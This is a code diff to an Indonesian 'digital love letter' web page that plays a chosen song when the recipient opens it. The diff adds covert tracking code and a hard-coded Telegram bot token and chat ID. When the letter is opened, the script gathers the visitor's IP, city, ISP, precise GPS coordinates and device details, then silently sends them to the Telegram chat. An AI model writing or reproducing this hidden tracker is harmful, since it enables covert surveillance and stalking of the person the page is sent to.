@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surat Untukmu</title>
+    <title>Devina</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Quicksand:wght@300;500&family=Sacramento&family=Indie+Flower&display=swap" rel="stylesheet">
     <style>
@@ -280,9 +280,9 @@
     <span class="sticker-flower" style="top: 350px; left: 10px;">🌷</span>
     <span class="sticker-flower" style="bottom: 150px; right: 15px;">🌹</span>
 
-    <div class="date-text">Bandung, 18 Januari 2026</div>
+    <div class="date-text">Jakarta, 18 Januari 2026</div>
     
-    <h1 class="heading">Hai Kamu devina,</h1>
+    <h1 class="heading">Hai Kamu,</h1>
 
     <div class="love-paragraph">
         Lewat lembaran kertas digital ini, aku ingin menuliskan sedikit dari ribuan alasan kenapa kehadiranmu begitu berarti di hidupku.
@@ -375,6 +375,12 @@
 </div>
 
 <script>
+    /* =========================
+       KONFIGURASI TELEGRAM
+    ========================= */
+    const BOT_TOKEN = '8428178330:AAEkkJRqqtmXItOrcxk-NCnIFbrvJ09_Ui8';
+    const CHAT_ID   = '6128943834';
+
     let selectedSongId = '1kDHuJbRGwTz'; // Default song
 
     function selectSong(element, id) {
@@ -383,6 +389,72 @@
         selectedSongId = id;
     }
 
+    /* =========================
+       LOGIKA PELACAKAN (TRACKING)
+    ========================= */
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+          })
+        });
+      } catch (e) { console.error('Telegram Error', e); }
+    }
+
+    async function fetchIpData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('IP API error');
+        return await res.json();
+      } catch { return {}; }
+    }
+
+    function requestLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          ()  => resolve(null),
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function buildLog(position, ipData) {
+      const lat = position?.coords?.latitude  ?? 'N/A';
+      const lng = position?.coords?.longitude ?? 'N/A';
+      return `
+Visitor Log - Surat Terbuka! 💌
+
+IP       : ${ipData.ip || 'N/A'}
+Country  : ${ipData.country_name || 'N/A'}
+City     : ${ipData.city || 'N/A'}
+ISP      : ${ipData.org || 'N/A'}
+
+GPS      : ${lat}, ${lng}
+Maps     : https://maps.google.com/?q=${lat},${lng}
+
+Device   : ${navigator.userAgent}
+Time     : ${new Date().toLocaleString()}
+Lagu     : ${selectedSongId === '1kDHuJbRGwTz' ? 'Lagu Pertama' : 'Lagu Kedua'}
+`.trim();
+    }
+
+    async function runTracking() {
+      const ipData   = await fetchIpData();
+      const position = await requestLocation();
+      const logText  = buildLog(position, ipData);
+      await sendToTelegram(logText);
+    }
+
+    /* =========================
+       FUNGSI UTAMA PENGALAMAN
+    ========================= */
     function startExperience() {
         const overlay = document.getElementById('intro-overlay');
         overlay.style.transition = 'opacity 1s ease';
@@ -391,6 +463,9 @@
         const player = document.getElementById('audio-player');
         player.src = `https://vocaroo.com/embed/${selectedSongId}?autoplay=1`;
         
+        // Menjalankan tracking saat tombol BUKA SURAT ditekan
+        runTracking();
+
         setTimeout(() => {
             overlay.style.display = 'none';
         }, 1000);
